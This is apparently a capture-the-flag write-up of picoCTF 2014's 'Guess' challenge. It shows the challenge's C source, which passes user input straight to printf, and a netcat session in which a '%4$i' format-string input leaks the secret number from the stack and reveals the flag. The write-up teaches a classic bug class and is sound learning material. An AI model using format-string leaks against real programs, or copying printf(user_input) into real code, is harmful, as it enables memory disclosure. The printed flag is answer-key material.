### Solved by Swappage

Guess was a basic 75 points binary exploitation challenge in picoCTF 2014

![](/images/2014/pico/guess/problem.png)

<!-- more -->

The source code was available for download so it was really quick to spot the vuln:

```c
	#include <stdio.h>
	#include <stdlib.h>

	char *flag = "~~FLAG~~";

	void main(){
	    int secret, guess;
	    char name[32];
	    long seed;

	    FILE *f = fopen("/dev/urandom", "rb");
	    fread(&secret, sizeof(int), 1, f);
	    fclose(f);

	    printf("Hello! What is your name?\n");
	    fgets(name, sizeof(name), stdin);

	    printf("Welcome to the guessing game, ");
	    printf(name);
	    printf("\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance of guessing it. Good luck.\n");

	    printf("What is your guess?\n");
	    scanf("%d", &guess);

	    if(guess == secret){
		printf("Wow! You guessed it!\n");
		printf("Your flag is: %s\n", flag);
	    }else{
		printf("Hah! I knew you wouldn't get it.\n");
	    }
	}
```

At line 19 there is a wonderful printf(name), which obviously results in a format string exploitable bug.

The program is pretty simple in its functionality, what it does is to open a file from which it reads the flag, then it generates a random number and asks you for your name.
Then it asks you to guess the number it generated.

Obviously abusing the format string bug, we can leak the informations from memory, read the number from the stack and reply with the correct answer, at which point we are returned the flag.

On my local machine using gdb could spot where the number was stored on the stack very precisely, which was at %14$i.
This didn't work on the real target most likely because the binary was compiled under a different system, but with a little of brute forcing, i could eventually work things out

	$ nc vuln2014.picoctf.com 4546
	Hello! What is your name?
	%4$i
	Welcome to the guessing game, -1715610369

	I generated a random 32-bit number.
	You have a 1 in 2^32 chance of guessing it. Good luck.
	What is your guess?
	-1715610369
	Wow! You guessed it!
	Your flag is: leak_the_seakret


